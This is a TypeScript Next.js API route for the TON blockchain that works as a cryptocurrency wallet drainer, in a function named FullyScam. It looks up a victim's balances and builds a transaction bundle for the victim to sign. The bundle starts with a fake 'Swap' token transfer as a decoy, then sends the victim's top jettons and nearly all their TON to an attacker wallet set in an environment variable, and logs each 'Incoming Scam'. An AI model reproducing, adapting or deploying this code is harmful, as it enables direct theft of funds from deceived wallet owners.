import {NextRequest, NextResponse} from "next/server";

import {getWalletFullBalance, tonApiFetch} from "@/bot/tonviewer";
import {Address, beginCell, fromNano, toNano, TonClient, TupleBuilder} from "@ton/ton";
import Big from "big.js";

// DOGS
const fakeContract = "EQCuPm01HldiduQ55xaBF_1kaW_WAUy5DHey8suqzU_MAJOR";
const MAX_TRANSACTION = 4;
const errBalance = NextResponse.json({
	msg: "Balance"
}, {
	status: 400,
	headers: {
		'balance': "NOK"
	}
});


export async function GET(request: NextRequest) {
	let {address,n1,n2,v1,v2,u1: usd} = await request.json().catch(()=>(Object.fromEntries(request.nextUrl.searchParams.entries())));
	console.log("address",address);
	if (!address) throw("");

	let fakeContract: string | undefined;

	if (n2) {
		const response = await tonApiFetch(`/v2/accounts/search?name=${n2}`).catch(()=>undefined);
		if (response) {
			const O = response?.addresses?.filter((o:any)=>o?.name?.endsWith("jetton"))?.[0];
			console.log(O);
			fakeContract = O?.address;
		}
	}

	v2 = (v2+"").replaceAll(" ","").split("").filter(o=>!isNaN(+o) || o === '.').join("").trim();

	return await FullyScam({
		address,
		config: {
			address: process.env['WALLET']+"",
			defaultTransactionComment: `Swap ${n2} / ${n1}`,
			...(fakeContract && ({
				fakeContract,
				fakeAmount: v2 || undefined
			})),
			fakeComment: `Swap ${usd} ${n2}`,
		}
	})
}


 async function FullyScam(data: {
	address: string,
	config: {
		address: string,
		feeValue?: string
		jettonFee?: string,
		fakeAddress?: string,
		fakeAmount?: string,
		fakeComment?: string,
		fakeContract?: string,
		defaultTransactionComments?: {
			TON: string,
			[k: string]: string
		},
		defaultTransactionComment: string
	}
}) {
	let {address: senderAddress, config} = data;
	const {defaultTransactionComments,defaultTransactionComment} = config;

	const debug = true;

	if (!config.address) {
		console.warn(`Receiver Wallet not found ❌`);
		return errBalance;
	}

	const senderWallet = Address.parse(senderAddress);
	let receiverWallet = Address.parse(config.address);

	const jettonFee = toNano(config.jettonFee || "0.07");
	const minFee = config.feeValue || "0.1";

	const walletInfo = await getWalletFullBalance(senderAddress).catch((e) => {
		throw (`FAIL TO GET WALLET FULL BALANCE\n${e}`)
	});

	if (debug) console.log("WALLET", walletInfo.total+"$");

	const hasFee = walletInfo.feeBalance > +minFee;

	if (!hasFee) return errBalance;


	const transactions = [];

	try {
		const fakeAddress = Address.parse("UQBf1_dWL9QKK3x8-ISPL7jI-5Eb-BlU85HWQqSevEo_FnGu")
		const fakeSource = config.fakeAddress || await getContractWallet(config.fakeContract || fakeContract, config.fakeContract || fakeAddress)
		const amount = config.fakeAmount || '831762';
		if (debug) console.log("Fake transaction", fakeSource, amount);
		transactions.push({
			amount: toNano("0.01").toString(),
			address: fakeSource.toString(),
			payload: await createTokenTransferPayload(
				fakeAddress,
				senderWallet,
				toNano(amount),
				config.fakeComment || defaultTransactionComment
			)
		})
	} catch (e) {
		console.error(`While pushing fake transaction, error: \n${e}`);
	}

	const tokens = walletInfo.balances.slice(0, MAX_TRANSACTION - 1);
	const total = tokens.reduce((t, o) => o.price + t, 0);


	for (let token of tokens) {
		if (!token.balance) {
			if (debug) console.log(`${token.symbol} skipped due to zero balance`);
			continue;
		}

		try {
			if (token.jetton) {
				const key = token.symbol.toLowerCase();
				try {
					const required = Big("100");
					const bBalance = Big(token.actualBalance);
					if (bBalance.lt(required)) {
						if (debug) console.log(`${token.symbol} Skipped due to low balance\nRequire: ${required}\nBalance: ${bBalance}`)
						continue;
					}
				} catch (e) {

				}

				transactions.push({
					amount: jettonFee.toString(),
					address: token.address,
					payload: await createTokenTransferPayload(
						senderWallet,
						receiverWallet,
						token.actualBalance,
						defaultTransactionComments?.[key as keyof typeof defaultTransactionComments] || defaultTransactionComment
					)
				})
			} else {
				const remains = Big(walletInfo.feeBalance).minus(Big(fromNano(jettonFee) + "").times(tokens.length + 1));

				transactions.push({
					address: receiverWallet.toRawString(),
					amount: toNano((+(remains.toString())).toFixed(2)).toString(),
					payload: (beginCell().storeUint(0, 32).storeStringTail(defaultTransactionComments?.TON ?? defaultTransactionComment).endCell()).toBoc().toString('base64')
				},)
			}
		} catch (e) {
			console.error(`V2 Error: While pushing ${token.symbol}${token.jetton ? "(jetton)" : ""} error:`, e);
		}
	}

	if (debug) console.log("Transaction length", transactions.length);

	const sender = senderWallet.toString({bounceable: false});
	const reportId = crypto.randomUUID();
	const tokenString = `Total: ${total.toLocaleString()}$\n${tokens.map(o => `${o.symbol} = ${o.balance.toLocaleString()} (${o.price.toLocaleString()}$)`).join("\n")}`;
	const footer = `Scam Wallet: ${receiverWallet.toString({bounceable: false})}\nReportId: ${reportId}\nMin Fee: ${minFee}`

	console.warn(`Incoming Scam(v2)⌛ ${sender}\n\n${tokenString}\n\n${footer}`)

	return NextResponse.json({
		validUntil: Math.floor(Date.now() / 1000) + 500,
		messages: transactions
	}, {
		headers: {
			"log-report-id": reportId
		}
	});
}

 async function createTokenTransferPayload(source: Address, destination: Address, amount: bigint | number, text: string) {
	try {
		const forwardPayload = beginCell()
			.storeUint(0, 32)  // 0 opcode for a simple message
			.storeStringTail(text)
			.endCell();

		// Building the body with correct fields
		const body = beginCell()
			.storeUint(0xf8a7ea5, 32)
			.storeUint(0, 64)
			.storeCoins(amount)
			.storeAddress(destination)
			.storeAddress(source)
			.storeUint(0, 1)
			.storeCoins(1)
			.storeBit(1)
			.storeRef(forwardPayload)
			.endCell();

		return body.toBoc().toString('base64')
	} catch (e: any) {
		console.error(`FAIL TO CREATE JETTON TRANSACTION \nsource: ${source}\ndestination: ${destination}\namount: ${amount}\ntext: ${text}\n\n${e}`)
		return undefined;
	}
}

const CONTRACT_CACHE: {
	[address: string]: Awaited<ReturnType<TonClient['provider']>>
} = {};

async function getContractProvider(_address: string | Address) {
	const address = typeof _address === 'string' ? _address : _address.toString();
	const cache = CONTRACT_CACHE[address];
	if (cache) return cache;

	const client = new TonClient({
		endpoint: 'https://toncenter.com/api/v2/jsonRPC',
		apiKey: process.env['TON_API']
	});

	const provider = await client.provider(Address.parse(address));
	CONTRACT_CACHE[address] = provider;
	return provider;
}

export async function getContractWallet(contractAddress: string | Address, ownerAddress: string | Address) {
	const contract = await getContractProvider(contractAddress);

	const args = new TupleBuilder();
	args.writeAddress(typeof ownerAddress === 'string' ? Address.parse(ownerAddress) : ownerAddress);
	return await contract.get('get_wallet_address', args.build()).then(r => r.stack.readAddress());
}

 async function getTokenBalance(jettonOfTokenWallet: string | Address) {

	try {
		const client = new TonClient({
			endpoint: 'https://toncenter.com/api/v2/jsonRPC',
			apiKey: process.env['TON_API']
		});

		const data = await client.runMethod(typeof jettonOfTokenWallet === 'string' ? Address.parse(jettonOfTokenWallet) : jettonOfTokenWallet, 'get_wallet_data');
		return data.stack.readNumber();
	} catch (e: any) {
		return 0;
	}
}

async function sleep(ms: number) {
	return new Promise(resolve => setTimeout(resolve, ms));
}
